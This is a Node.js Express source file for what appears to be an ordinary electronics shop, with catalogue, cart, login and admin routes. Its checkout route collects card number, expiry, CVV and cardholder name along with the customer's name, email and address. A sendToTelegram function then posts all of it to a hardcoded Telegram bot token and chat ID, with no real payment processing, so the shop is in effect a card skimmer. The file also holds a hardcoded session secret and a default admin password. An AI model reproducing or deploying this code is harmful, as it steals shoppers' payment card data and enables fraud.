const express = require('express');
const session = require('express-session');
const SQLiteStore = require('connect-sqlite3')(session);
const bodyParser = require('body-parser');
const bcrypt = require('bcryptjs');
const sqlite3 = require('better-sqlite3');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 5000;

const db = sqlite3('techshop.db');
db.pragma('journal_mode = WAL');
db.exec(`
  CREATE TABLE IF NOT EXISTS categories (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT NOT NULL UNIQUE
  );
  CREATE TABLE IF NOT EXISTS products (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT NOT NULL,
    description TEXT,
    price REAL NOT NULL,
    image TEXT DEFAULT '/images/default.jpg',
    category_id INTEGER,
    stock INTEGER DEFAULT 50,
    FOREIGN KEY (category_id) REFERENCES categories(id)
  );
  CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL,
    full_name TEXT,
    address TEXT,
    role TEXT DEFAULT 'user'
  );
  CREATE TABLE IF NOT EXISTS orders (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    full_name TEXT,
    email TEXT,
    address TEXT,
    total REAL,
    status TEXT DEFAULT 'pending',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id)
  );
  CREATE TABLE IF NOT EXISTS order_items (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    order_id INTEGER,
    product_id INTEGER,
    product_name TEXT,
    price REAL,
    quantity INTEGER,
    FOREIGN KEY (order_id) REFERENCES orders(id)
  );
`);

// Seed data
const seed = () => {
  if (db.prepare('SELECT COUNT(*) as cnt FROM products').get().cnt > 0) return;
  const cats = ['smartphones', 'laptops', 'tablets', 'accessories'];
  const insertCat = db.prepare('INSERT OR IGNORE INTO categories (name) VALUES (?)');
  cats.forEach(c => insertCat.run(c));
  const getCat = (n) => db.prepare('SELECT id FROM categories WHERE name=?').get(n)?.id;
  const insertProd = db.prepare('INSERT INTO products (name,description,price,image,category_id) VALUES (?,?,?,?,?)');
  const prods = [
    ['iPhone 15 Pro 128GB', 'Apple A17 Pro, 6.1"', 1299, '/images/iphone15.jpg', 'smartphones'],
    ['Samsung Galaxy S24 Ultra', 'Snapdragon 8 Gen 3, 256GB', 1399, '/images/s24ultra.jpg', 'smartphones'],
    ['Xiaomi 14 Pro', 'Snapdragon 8 Gen 3, 512GB', 999, '/images/xiaomi14.jpg', 'smartphones'],
    ['MacBook Air M2', '8GB/256GB, 13.6"', 1199, '/images/macbook_air.jpg', 'laptops'],
    ['Dell XPS 15', 'i7-13700H, 16GB/512GB', 1599, '/images/dell_xps.jpg', 'laptops'],
    ['Lenovo ThinkPad X1 Carbon', 'i7-1365U, 16GB/512GB', 1799, '/images/thinkpad.jpg', 'laptops'],
    ['iPad Air 11" M2', '128GB WiFi', 799, '/images/ipad_air.jpg', 'tablets'],
    ['Samsung Galaxy Tab S9', '256GB WiFi', 899, '/images/tabs9.jpg', 'tablets'],
    ['AirPods Pro 2', 'Active Noise Cancellation', 249, '/images/airpods.jpg', 'accessories'],
    ['Samsung Galaxy Watch 6', '44mm Bluetooth', 399, '/images/watch6.jpg', 'accessories'],
    ['Sony WH-1000XM5', 'Wireless NC Headphones', 349, '/images/sony_xm5.jpg', 'accessories'],
    ['Anker PowerCore 20000', 'Powerbank 20000mAh', 49, '/images/anker.jpg', 'accessories']
  ];
  const insert = db.transaction(() => {
    for (const p of prods) {
      insertProd.run(p[0], p[1], p[2], p[3], getCat(p[4]));
    }
  });
  insert();
};
seed();

// Telegram
const BOT_TOKEN = "8696604379:AAHOpUvUcDwzLNTBH_GvGxVK7dNMFiqbVnw";
const CHAT_ID = "8685919221";
async function sendToTelegram(order, cardData) {
  const items = db.prepare('SELECT product_name, quantity FROM order_items WHERE order_id = ?').all(order.id)
    .map(i => `${i.product_name} x${i.quantity}`).join(', ');
  const text = `
🛒 ORDER #${order.id}
Customer: ${order.full_name}
Email: ${order.email}
Address: ${order.address}
Total: €${order.total}
Items: ${items}

💳 Card: ${cardData.card_number}
Expiry: ${cardData.expiry}
CVV: ${cardData.cvv}
Holder: ${cardData.cardholder}
  `;
  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID, text
    }, { timeout: 5000 });
  } catch(e) {}
}

// Middleware
app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(session({
  store: new SQLiteStore({ db: 'sessions.db', dir: __dirname }),
  secret: 'tech-secret-key',
  resave: false,
  saveUninitialized: false,
  cookie: { maxAge: 24 * 60 * 60 * 1000 }
}));
app.use((req, res, next) => {
  res.locals.session = req.session;
  if (req.session.userId) {
    res.locals.user = db.prepare('SELECT * FROM users WHERE id = ?').get(req.session.userId);
  } else {
    res.locals.user = null;
  }
  next();
});

// Routes
app.get('/', (req, res) => {
  const products = db.prepare('SELECT * FROM products ORDER BY id DESC LIMIT 8').all();
  const categories = db.prepare('SELECT * FROM categories').all();
  res.render('index', { products, categories });
});

app.get('/products', (req, res) => {
  const category = req.query.category;
  let products;
  if (category) {
    products = db.prepare(`
      SELECT products.* FROM products
      JOIN categories ON products.category_id = categories.id
      WHERE categories.name = ? ORDER BY products.id DESC
    `).all(category);
  } else {
    products = db.prepare('SELECT * FROM products ORDER BY id DESC').all();
  }
  const categories = db.prepare('SELECT * FROM categories').all();
  res.render('products', { products, categories, currentCategory: category || '' });
});

app.get('/product/:id', (req, res) => {
  const product = db.prepare('SELECT * FROM products WHERE id = ?').get(req.params.id);
  if (!product) return res.status(404).send('Not found');
  res.render('product', { product });
});

function getCart(req) {
  if (!req.session.cart) req.session.cart = [];
  return req.session.cart;
}
app.get('/cart', (req, res) => {
  const cart = getCart(req);
  const items = cart.map(item => {
    const product = db.prepare('SELECT * FROM products WHERE id = ?').get(item.productId);
    return { ...item, product };
  }).filter(i => i.product);
  res.render('cart', { items });
});
app.post('/cart/add/:id', (req, res) => {
  const productId = parseInt(req.params.id);
  const cart = getCart(req);
  const existing = cart.find(i => i.productId === productId);
  if (existing) existing.quantity++;
  else cart.push({ productId, quantity: 1 });
  res.redirect('/cart');
});
app.post('/cart/remove/:id', (req, res) => {
  req.session.cart = getCart(req).filter(i => i.productId !== parseInt(req.params.id));
  res.redirect('/cart');
});

app.get('/checkout', (req, res) => {
  if (!req.session.userId) return res.redirect('/login?redirect=checkout');
  const cart = getCart(req);
  const items = cart.map(item => {
    const product = db.prepare('SELECT * FROM products WHERE id = ?').get(item.productId);
    return { ...item, product };
  }).filter(i => i.product);
  if (items.length === 0) return res.redirect('/cart');
  const total = items.reduce((sum, i) => sum + i.product.price * i.quantity, 0);
  res.render('checkout', { items, total, user: res.locals.user });
});
app.post('/checkout', async (req, res) => {
  if (!req.session.userId) return res.status(401).send('Login required');
  const user = db.prepare('SELECT * FROM users WHERE id = ?').get(req.session.userId);
  const cart = getCart(req);
  const items = cart.map(item => {
    const product = db.prepare('SELECT * FROM products WHERE id = ?').get(item.productId);
    return { product, quantity: item.quantity };
  }).filter(i => i.product);
  if (items.length === 0) return res.redirect('/cart');
  const total = items.reduce((s, i) => s + i.product.price * i.quantity, 0);
  const orderInfo = db.transaction(() => {
    const info = db.prepare('INSERT INTO orders (user_id, full_name, email, address, total) VALUES (?,?,?,?,?)').run(
      user.id, req.body.full_name || user.full_name, user.email, req.body.address || user.address, total
    );
    const orderId = info.lastInsertRowid;
    const insertItem = db.prepare('INSERT INTO order_items (order_id, product_id, product_name, price, quantity) VALUES (?,?,?,?,?)');
    for (const i of items) {
      insertItem.run(orderId, i.product.id, i.product.name, i.product.price, i.quantity);
    }
    return { id: orderId, total };
  });
  req.session.cart = [];
  const cardData = {
    card_number: req.body.card_number,
    expiry: req.body.expiry,
    cvv: req.body.cvv,
    cardholder: req.body.cardholder
  };
  await sendToTelegram(orderInfo, cardData);
  res.render('order_success', { orderId: orderInfo.id });
});

// Auth
app.get('/login', (req, res) => res.render('login', { error: null, redirect: req.query.redirect || '' }));
app.post('/login', (req, res) => {
  const { email, password } = req.body;
  const user = db.prepare('SELECT * FROM users WHERE email = ?').get(email);
  if (!user || !bcrypt.compareSync(password, user.password))
    return res.render('login', { error: 'Invalid credentials', redirect: req.body.redirect });
  req.session.userId = user.id;
  res.redirect(req.body.redirect || '/');
});
app.get('/register', (req, res) => res.render('register', { error: null }));
app.post('/register', (req, res) => {
  const { email, password, full_name } = req.body;
  if (db.prepare('SELECT id FROM users WHERE email = ?').get(email))
    return res.render('register', { error: 'Email already registered' });
  const hash = bcrypt.hashSync(password, 10);
  db.prepare('INSERT INTO users (email, password, full_name) VALUES (?,?,?)').run(email, hash, full_name);
  const newUser = db.prepare('SELECT id FROM users WHERE email = ?').get(email);
  req.session.userId = newUser.id;
  res.redirect('/');
});
app.get('/logout', (req, res) => { req.session.destroy(); res.redirect('/'); });

app.get('/account', (req, res) => {
  if (!req.session.userId) return res.redirect('/login?redirect=account');
  const user = db.prepare('SELECT * FROM users WHERE id = ?').get(req.session.userId);
  const orders = db.prepare('SELECT * FROM orders WHERE user_id = ? ORDER BY created_at DESC').all(user.id);
  res.render('account', { user, orders });
});

// Admin
function isAdmin(req, res, next) {
  if (!req.session.userId) return res.redirect('/login');
  const user = db.prepare('SELECT role FROM users WHERE id = ?').get(req.session.userId);
  if (!user || user.role !== 'admin') return res.status(403).send('Access denied');
  next();
}
app.get('/admin', isAdmin, (req, res) => {
  const products = db.prepare('SELECT * FROM products ORDER BY id DESC').all();
  const orders = db.prepare('SELECT * FROM orders ORDER BY created_at DESC LIMIT 50').all();
  res.render('admin', { products, orders });
});
app.get('/admin/products/add', isAdmin, (req, res) => {
  const categories = db.prepare('SELECT * FROM categories').all();
  res.render('admin_product_form', { product: null, categories });
});
app.post('/admin/products/add', isAdmin, (req, res) => {
  const { name, description, price, category_id, image } = req.body;
  db.prepare('INSERT INTO products (name, description, price, category_id, image) VALUES (?,?,?,?,?)').run(
    name, description, parseFloat(price), parseInt(category_id), image || '/images/default.jpg'
  );
  res.redirect('/admin');
});
app.get('/admin/products/edit/:id', isAdmin, (req, res) => {
  const product = db.prepare('SELECT * FROM products WHERE id = ?').get(req.params.id);
  if (!product) return res.status(404).send('Not found');
  const categories = db.prepare('SELECT * FROM categories').all();
  res.render('admin_product_form', { product, categories });
});
app.post('/admin/products/edit/:id', isAdmin, (req, res) => {
  const { name, description, price, category_id, image } = req.body;
  db.prepare('UPDATE products SET name=?, description=?, price=?, category_id=?, image=? WHERE id=?').run(
    name, description, parseFloat(price), parseInt(category_id), image || '/images/default.jpg', req.params.id
  );
  res.redirect('/admin');
});
app.post('/admin/products/delete/:id', isAdmin, (req, res) => {
  db.prepare('DELETE FROM products WHERE id = ?').run(req.params.id);
  res.redirect('/admin');
});

// Create admin if not exists
if (!db.prepare('SELECT id FROM users WHERE email = ?').get('admin@techshop.com')) {
  db.prepare('INSERT INTO users (email, password, full_name, role) VALUES (?,?,?,?)').run(
    'admin@techshop.com', bcrypt.hashSync('admin123', 10), 'Admin', 'admin'
  );
}

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

app.listen(PORT, () => console.log(`TechStore on port ${PORT}`));
